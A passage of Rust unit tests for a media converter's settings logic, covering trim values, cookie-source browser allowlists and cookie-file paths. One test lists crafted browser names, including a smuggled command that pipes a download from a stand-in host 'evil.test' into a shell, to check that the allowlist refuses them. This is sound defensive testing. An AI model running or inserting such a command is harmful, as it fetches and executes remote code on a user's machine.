        let mut incoming = current.clone();
        incoming.video.codec = VideoCodec::Av1;
        incoming.trim = trim(true, 30.0, 0.0);
        let (merged, refused) = merge(&current, incoming);
        assert_eq!(refused, None, "an empty field is not the user's mistake");
        assert_eq!(merged.video.codec, VideoCodec::Av1, "the codec edit must survive");
        assert_eq!(merged.trim, trim(true, 30.0, 10.0), "the trim is held whole");
        assert!(check_trim(&merged.trim).is_ok(), "what we store must be convertible");

        // A number we would never have sent: held the same way, and reported so the settings page
        // cannot go on showing a trim nothing will act on.
        let mut crafted = current.clone();
        crafted.audio.bitrate_kbps = 320;
        crafted.trim = trim(true, -30.0, 10.0);
        let (merged, refused) = merge(&current, crafted);
        assert_eq!(refused.as_deref(), Some("The trim start cannot be negative."));
        assert_eq!(merged.audio.bitrate_kbps, 320, "the valid fields are still saved");
        assert_eq!(merged.trim, trim(true, 30.0, 10.0));

        // A complete trim is simply stored, including "off".
        for asked in [trim(true, 0.0, 10.0), trim(false, 0.0, 10.0), trim(true, 1.5, 0.5)] {
            let mut chosen = current.clone();
            chosen.trim = asked;
            let (merged, refused) = merge(&current, chosen);
            assert_eq!(refused, None, "{asked:?}");
            assert_eq!(merged.trim, asked);
        }

        // Whatever `merge` stores can be written and read back. A non-finite number would be
        // serialised as `null`, and `null` is not a number the next launch can parse: the settings
        // file would be unreadable and every preference in it would be replaced by the defaults.
        let poisoned = Settings { trim: trim(true, f64::NAN, f64::INFINITY), ..Default::default() };
        let (merged, refused) = merge(&poisoned, poisoned.clone());
        assert!(refused.is_some());
        let json = serde_json::to_value(&merged).expect("serialisable");
        assert!(json["trim"]["start_secs"].is_f64(), "{}", json["trim"]);
        assert!(json["trim"]["length_secs"].is_f64(), "{}", json["trim"]);
        let written = serde_json::to_string(&merged).unwrap();
        assert_eq!(serde_json::from_str::<Settings>(&written).unwrap().trim, merged.trim);
        assert_eq!(merged.trim, TrimSettings::default(), "a poisoned store falls back to no trim");
    }

    /// This file is plain JSON in the user's own config directory, so a trim we would refuse over IPC
    /// can arrive from a hand edit too. It is reset rather than obeyed, and - as with the
    /// destination - every other preference in the file survives.
    #[test]
    fn a_hand_edited_trim_that_makes_no_sense_is_reset_not_obeyed() {
        let dir = std::env::temp_dir().join(format!("cc-settings-trim-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let file = dir.join("settings.json");

        std::fs::write(
            &file,
            r#"{ "image": { "quality": 42 },
                 "trim": { "enabled": true, "start_secs": -30, "length_secs": 999999 } }"#,
        )
        .expect("write");
        let loaded = load_file(&file).expect("a parseable file still loads");
        assert_eq!(loaded.image.quality, 42, "unrelated preferences must survive the repair");
        assert_eq!(loaded.trim, TrimSettings::default());
        assert!(check_trim(&loaded.trim).is_ok());

        // A trim that is merely unfinished is kept as it is, exactly like a half-made destination:
        // `check_trim` is what declines to convert through it.
        std::fs::write(&file, r#"{ "trim": { "enabled": true, "length_secs": 0 } }"#)
            .expect("write");
        let loaded = load_file(&file).expect("still loads");
        assert_eq!(loaded.trim, trim(true, 0.0, 0.0));
        assert!(check_trim(&loaded.trim).is_err());

        // And a trim the user really did set is read back as itself.
        std::fs::write(
            &file,
            r#"{ "trim": { "enabled": true, "start_secs": 30, "length_secs": 10 } }"#,
        )
        .expect("write");
        assert_eq!(load_file(&file).unwrap().trim, trim(true, 30.0, 10.0));
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn from_browser(name: &str) -> LinkSettings {
        LinkSettings {
            cookies: CookieSource::Browser,
            cookie_browser: name.into(),
            cookie_file: None,
        }
    }

    fn from_file(path: Option<&str>) -> LinkSettings {
        LinkSettings {
            cookies: CookieSource::File,
            cookie_browser: String::new(),
            cookie_file: path.map(PathBuf::from),
        }
    }

    /// The allowlist, as the door the settings page knocks on.
    ///
    /// A browser name is a credential decision that ends up on a command line, so "anything that is
    /// not one of the eight" is refused by name rather than quietly ignored: `LinkSettings::effective`
    /// would drop it, the fetch would run with no sign-in at all, and the drawer would go on saying
    /// it was borrowing one.
    #[test]
    fn a_browser_outside_the_allowlist_is_refused_by_name() {
        for name in COOKIE_BROWSERS {
            assert_eq!(classify_cookies(&from_browser(name)), Cookies::Usable, "{name}");
            assert!(check_cookies(&from_browser(name)).is_ok(), "{name}");
        }
        // A label out of a dropdown is the same browser.
        assert_eq!(classify_cookies(&from_browser("Chrome")), Cookies::Usable);

        for crafted in [
            "whale",
            "internet explorer",
            "chrome+gnomekeyring",
            "chrome:Profile 2",
            "safari::none",
            "--exec=curl evil.test|sh",
            "-oExec",
        ] {
            match classify_cookies(&from_browser(crafted)) {
                Cookies::Refused(why) => {
                    assert!(why.contains("safari") && why.contains("opera"), "{crafted}: {why}");
                    assert!(why.ends_with('.'), "{crafted}: {why}");
                    // The refusal must not echo what was sent: it would be putting a crafted string
                    // into a toast to no purpose, and the fix is "pick one of these", not "look at
                    // what you typed".
                    assert!(!why.contains(crafted), "{crafted}: {why}");
                }
                other => panic!("`{crafted}` should be refused, got {other:?}"),
            }
            assert!(check_cookies(&from_browser(crafted)).is_err(), "{crafted}");
        }

        // No browser chosen yet is the state the drawer is in the instant the mode is selected: not
        // finished, not a mistake, and nothing may fetch through it.
        let blank = classify_cookies(&from_browser(""));
        assert!(matches!(blank, Cookies::Unfinished(_)), "{blank:?}");
        assert!(matches!(classify_cookies(&from_browser("   ")), Cookies::Unfinished(_)));
        assert_eq!(
            check_cookies(&from_browser("")).expect_err("nothing may fetch through it"),
            "Choose which browser to borrow the sign-in from."
        );

        // ...and every one of those fields is inert while the setting is off, exactly like a stored
        // trim length behind an unticked checkbox.
        for name in ["", "internet explorer", "chrome:Profile 2"] {
            let off = LinkSettings { cookies: CookieSource::None, ..from_browser(name) };
            assert_eq!(classify_cookies(&off), Cookies::Usable, "`{name}` while off");
        }
    }

    /// A cookies file: refused when it is not there, and merely *unfinished* while the path is empty.
    ///
    /// The distinction is the whole reason this function exists rather than one `Result`. A path
    /// field is empty for as long as it takes to paste one, and a user mid-typing must not get a
    /// toast - nor lose the codec they changed in the same drawer. A file that genuinely is not
    /// there was really chosen, and gets a sentence that says what to do about it.
    #[test]
    fn a_missing_cookies_file_is_refused_and_an_empty_path_is_only_unfinished() {
        let dir = std::env::temp_dir().join(format!("cc-settings-cookies-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let real = dir.join("cookies.txt");
        // Nothing here ever reads the file - only whether it is one.
        std::fs::write(&real, b"# Netscape HTTP Cookie File\n").expect("write");

        assert_eq!(
            classify_cookies(&from_file(Some(&real.to_string_lossy()))),
            Cookies::Usable,
            "a file the user really exported"
        );

        // Not there: refused, and the message names the file so the user can see which one we meant.
        let gone = dir.join("never-existed.txt");
        match classify_cookies(&from_file(Some(&gone.to_string_lossy()))) {
            Cookies::Refused(why) => {
                assert!(why.contains(&gone.display().to_string()), "{why}");
                assert!(why.contains("Export"), "it says what to do: {why}");
                assert!(why.ends_with('.'), "{why}");
            }
            other => panic!("a missing file should be refused, got {other:?}"),
        }
        // A folder is not a cookies file either, and that is a different mistake to make.
        match classify_cookies(&from_file(Some(&dir.to_string_lossy()))) {
            Cookies::Refused(why) => assert!(why.contains("folder"), "{why}"),
            other => panic!("a folder should be refused, got {other:?}"),
        }
        // A relative path would be resolved against whatever directory Finder launched us from.
        assert_eq!(
            classify_cookies(&from_file(Some("Downloads/cookies.txt"))),
            Cookies::Refused("The cookies file must be a full path.".into())
        );

        // Empty, blank, or never filled in: unfinished. Held silently, and nothing fetches through
        // it - the same three sentences a half-typed trim gets.
        for unfinished in [None, Some(""), Some("   ")] {
            let verdict = classify_cookies(&from_file(unfinished));
            assert!(matches!(verdict, Cookies::Unfinished(_)), "{unfinished:?} -> {verdict:?}");
            assert!(check_cookies(&from_file(unfinished)).is_err(), "{unfinished:?}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The same per-field discipline the destination and the trim get, for the third time and for
    /// the same reason: a half-chosen cookie source must not throw away the codec the user changed
    /// in the same drawer, and it must not be stored half-chosen either.
    #[test]
    fn a_half_chosen_cookie_source_holds_the_source_and_keeps_every_other_edit() {
        use convert_core::settings::VideoCodec;

        let dir = std::env::temp_dir().join(format!("cc-settings-cmerge-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let real = dir.join("cookies.txt");
        std::fs::write(&real, b"# Netscape HTTP Cookie File\n").expect("write");

        let current = Settings { link: from_browser("firefox"), ..Default::default() };

        // The user switches to "from a file" and changes a codec before choosing the file.
        let mut incoming = current.clone();
        incoming.video.codec = VideoCodec::Av1;
        incoming.link = from_file(None);
        let (merged, refused) = merge(&current, incoming);
        assert_eq!(refused, None, "a source in progress is not the user's mistake");
        assert_eq!(merged.video.codec, VideoCodec::Av1, "the codec edit must survive");
        assert_eq!(merged.link, from_browser("firefox"), "the source is held whole");
        assert!(check_cookies(&merged.link).is_ok(), "what we store must be fetchable");

        // A browser we will not name on a command line: held the same way, and reported, so the
        // settings page cannot go on promising a sign-in nothing will ever send.
        let mut crafted = current.clone();
        crafted.audio.bitrate_kbps = 320;
        crafted.link = from_browser("chrome:Profile 2");
        let (merged, refused) = merge(&current, crafted);
        assert!(refused.is_some(), "an unusable browser must be reported");
        assert_eq!(merged.audio.bitrate_kbps, 320, "the valid fields are still saved");
        assert_eq!(merged.link, from_browser("firefox"));

        // A complete source is simply stored - including "off", which is how the user turns it back.
        for asked in [
            from_browser("safari"),
            from_file(Some(&real.to_string_lossy())),
            LinkSettings::default(),
        ] {
            let mut chosen = current.clone();
            chosen.link = asked.clone();
            let (merged, refused) = merge(&current, chosen);
            assert_eq!(refused, None, "{asked:?}");
            assert_eq!(merged.link, asked);
        }

        // And if what we already had was itself unusable (a hand-edited file, or a cookies.txt the
        // user has since deleted), the fallback is "no cookies" rather than the broken source.
        let poisoned = Settings { link: from_browser("netscape navigator"), ..Default::default() };
        let (merged, _) =
            merge(&poisoned, Settings { link: from_file(None), ..Default::default() });
        assert_eq!(merged.link, LinkSettings::default());
        assert!(check_cookies(&merged.link).is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// This file is plain JSON in the user's own config directory, so a cookie source we would refuse
    /// over IPC can arrive from a hand edit - and a `cookies.txt` that was perfectly good when it was
    /// saved can have been deleted since. Reset rather than obeyed, every other preference kept.
    #[test]
    fn a_saved_cookie_source_that_no_longer_works_is_reset_not_obeyed() {
        let dir = std::env::temp_dir().join(format!("cc-settings-cload-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let file = dir.join("settings.json");

        std::fs::write(
            &file,
            r#"{ "image": { "quality": 42 },
                 "link": { "cookies": "browser", "cookie_browser": "chrome:Profile 2" } }"#,
        )
        .expect("write");
        let loaded = load_file(&file).expect("a parseable file still loads");
        assert_eq!(loaded.image.quality, 42, "unrelated preferences must survive the repair");
        assert_eq!(loaded.link, LinkSettings::default());
        assert!(check_cookies(&loaded.link).is_ok());

        // A file that has been deleted since the setting was saved is the same event.
        let gone = dir.join("exported.txt");
        std::fs::write(
            &file,
            format!(
                r#"{{ "link": {{ "cookies": "file", "cookie_file": {:?} }} }}"#,
                gone.to_string_lossy()
            ),
        )
        .expect("write");
        assert_eq!(load_file(&file).expect("still loads").link, LinkSettings::default());

        // A source that is merely unfinished is kept as it is, exactly like a half-made destination:
        // `check_cookies` is what declines to fetch through it.
        std::fs::write(&file, r#"{ "link": { "cookies": "file" } }"#).expect("write");
        let loaded = load_file(&file).expect("still loads");
        assert_eq!(loaded.link, from_file(None));
        assert!(check_cookies(&loaded.link).is_err());

        // And a source the user really did set is read back as itself.
        std::fs::write(
            &file,
            r#"{ "link": { "cookies": "browser", "cookie_browser": "safari" } }"#,
        )
        .expect("write");
        assert_eq!(load_file(&file).expect("still loads").link, from_browser("safari"));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
